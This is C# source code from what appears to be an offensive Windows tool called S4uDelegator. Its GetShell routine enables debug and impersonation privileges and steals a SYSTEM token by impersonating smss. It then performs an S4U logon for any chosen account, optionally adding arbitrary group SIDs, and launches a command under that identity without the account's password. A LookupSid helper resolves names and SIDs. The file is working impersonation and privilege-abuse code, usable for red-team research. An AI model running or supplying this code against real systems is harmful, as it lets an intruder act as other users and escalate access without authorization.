using System;
using System.Collections.Generic;
using System.Runtime.InteropServices;
using System.Text.RegularExpressions;
using S4uDelegator.Interop;

namespace S4uDelegator.Library
{
    internal class Modules
    {
        public static bool GetShell(
            string command,
            string domain,
            string username,
            string sid,
            string[] extraSids)
        {
            bool isImpersonated;
            var groupSids = new List<string>();
            var requiredPrivs = new List<string>
            {
                Win32Consts.SE_TCB_NAME,
                Win32Consts.SE_ASSIGNPRIMARYTOKEN_NAME
            };
            var status = false;

            if (string.IsNullOrEmpty(sid) && string.IsNullOrEmpty(domain))
                domain = Environment.MachineName;

            if (!Utilities.VerifyAccountName(
                ref domain,
                ref username,
                ref sid,
                out string targetAccount,
                out string upn,
                out SID_NAME_USE sidType))
            {
                Console.WriteLine("[-] Invalid account is specified.");
                return false;
            }
            else
            {
                Console.WriteLine("[*] S4U logon target information:");
                Console.WriteLine("    [*] Account : {0}", targetAccount);
                Console.WriteLine("    [*] SID     : {0}", sid);
                Console.WriteLine("    [*] UPN     : {0}", upn ?? "(Null)");
                Console.WriteLine("    [*] Type    : {0}", sidType.ToString());
            }

            if (extraSids.Length > 0)
                Console.WriteLine("[>] Verifying extra group SID(s).");

            for (var idx = 0; idx < extraSids.Length; idx++)
            {
                bool isGroupSid = Utilities.IsGroupSid(
                    ref extraSids[idx],
                    out string accountName);

                if (isGroupSid)
                {
                    Console.WriteLine("[*] {0} (SID : {1}) will be added as a group.", accountName, extraSids[idx]);
                    groupSids.Add(extraSids[idx]);
                }
                else if (string.IsNullOrEmpty(accountName))
                {
                    Console.WriteLine("[-] {0} is not valid SID, so will be ignored.", extraSids[idx]);
                }
                else
                {
                    Console.WriteLine("[-] {0} (SID : {1}) is not group account, so will be ignored.", accountName, extraSids[idx]);
                }
            }

            if (!Utilities.EnableTokenPrivileges(
                new List<string> { Win32Consts.SE_DEBUG_NAME, Win32Consts.SE_IMPERSONATE_NAME },
                out Dictionary<string, bool> adjustedPrivs))
            {
                foreach (var priv in adjustedPrivs)
                {
                    if (!priv.Value)
                        Console.WriteLine("[-] Failed to enable {0}", priv.Key);
                }

                return false;
            }

            do
            {
                int error;
                IntPtr hImpersonationToken;
                LSA_STRING pkgName;
                TOKEN_SOURCE tokenSource;
                var startupInfo = new STARTUPINFO
                {
                    cb = Marshal.SizeOf(typeof(STARTUPINFO)),
                    lpDesktop = @"Winsta0\Default"
                };

                Console.WriteLine("[>] Trying to get SYSTEM.");

                isImpersonated = Utilities.ImpersonateAsSmss(requiredPrivs);

                if (!isImpersonated)
                {
                    foreach (var priv in adjustedPrivs)
                    {
                        if (!priv.Value)
                            Console.WriteLine("[-] Failed to enable {0}", priv.Key);
                    }

                    break;
                }
                else
                {
                    Console.WriteLine("[+] Got SYSTEM privileges.");
                }

                Console.WriteLine("[>] Trying to S4U logon.");

                if (string.IsNullOrEmpty(upn))
                {
                    pkgName = new LSA_STRING(Win32Consts.MSV1_0_PACKAGE_NAME);
                    tokenSource = new TOKEN_SOURCE("User32");
                }
                else
                {
                    pkgName = new LSA_STRING(Win32Consts.NEGOSSP_NAME_A);
                    tokenSource = new TOKEN_SOURCE("NtLmSsp");
                }

                hImpersonationToken = Utilities.GetS4uLogonToken(
                    username,
                    domain,
                    in pkgName,
                    in tokenSource,
                    groupSids);

                if (hImpersonationToken == IntPtr.Zero)
                {
                    error = Marshal.GetLastWin32Error();
                    Console.WriteLine("[-] Failed to S4U logon.");
                    Console.WriteLine("    |-> {0}", Helpers.GetWin32ErrorMessage(error, false));

                    if (error == Win32Consts.ERROR_ACCESS_DENIED)
                        Console.WriteLine("[!] Some extra groups may not be permitted.");

                    break;
                }

                status = NativeMethods.DuplicateTokenEx(
                    hImpersonationToken,
                    TokenAccessFlags.TOKEN_ALL_ACCESS,
                    IntPtr.Zero,
                    SECURITY_IMPERSONATION_LEVEL.Anonymous,
                    TOKEN_TYPE.TokenPrimary,
                    out IntPtr hPrimaryToken);
                NativeMethods.NtClose(hImpersonationToken);

                if (!status)
                {
                    error = Marshal.GetLastWin32Error();
                    Console.WriteLine("[-] Failed to duplicate S4U logon token.");
                    Console.WriteLine("    |-> {0}", Helpers.GetWin32ErrorMessage(error, false));
                    break;
                }
                else
                {
                    Console.WriteLine("[+] S4U logon is successful.");
                }

                Console.WriteLine("[>] Trying to create a token assigned process.");

                status = NativeMethods.CreateProcessAsUser(
                    hPrimaryToken,
                    null,
                    command,
                    IntPtr.Zero,
                    IntPtr.Zero,
                    false,
                    ProcessCreationFlags.CREATE_BREAKAWAY_FROM_JOB,
                    IntPtr.Zero,
                    Environment.CurrentDirectory,
                    in startupInfo,
                    out PROCESS_INFORMATION processInformation);
                NativeMethods.NtClose(hPrimaryToken);

                if (status)
                {
                    NativeMethods.WaitForSingleObject(processInformation.hProcess, uint.MaxValue);
                    NativeMethods.NtClose(processInformation.hThread);
                    NativeMethods.NtClose(processInformation.hProcess);
                }
                else
                {
                    error = Marshal.GetLastWin32Error();
                    Console.WriteLine("[-] Failed to create primary token.");
                    Console.WriteLine("    |-> {0}", Helpers.GetWin32ErrorMessage(error, false));
                }
            } while (false);

            if (isImpersonated)
                NativeMethods.RevertToSelf();

            Console.WriteLine("[*] Done.");

            return status;
        }


        public static bool LookupSid(string domain, string name, string stringSid)
        {
            string accountName = null;
            var sidType = SID_NAME_USE.Unknown;
            var status = false;

            if (!string.IsNullOrEmpty(stringSid) &&
                Regex.IsMatch(stringSid, @"^S(-[0-9]+)+$", RegexOptions.IgnoreCase))
            {
                accountName = Helpers.ConvertStringSidToAccountName(
                    ref stringSid,
                    out sidType);
                status = !string.IsNullOrEmpty(accountName);
            }
            else if (!string.IsNullOrEmpty(domain) || !string.IsNullOrEmpty(name))
            {
                if (!string.IsNullOrEmpty(domain) && (domain.Trim() == "."))
                    domain = Environment.MachineName;

                if (!string.IsNullOrEmpty(name) && !string.IsNullOrEmpty(domain))
                    accountName = string.Format(@"{0}\{1}", domain, name);
                else if (!string.IsNullOrEmpty(name))
                    accountName = name;
                else if (!string.IsNullOrEmpty(domain))
                    accountName = domain;

                stringSid = Helpers.ConvertAccountNameToStringSid(
                    ref accountName,
                    out sidType);
                status = !string.IsNullOrEmpty(stringSid);
            }

            if (status)
            {
                Console.WriteLine("[*] Account Name : {0}", accountName);
                Console.WriteLine("[*] SID          : {0}", stringSid);
                Console.WriteLine("[*] Account Type : {0}", sidType.ToString());
            }
            else
            {
                Console.WriteLine("[-] Queried account is not found.");
            }

            return status;
        }
    }
}
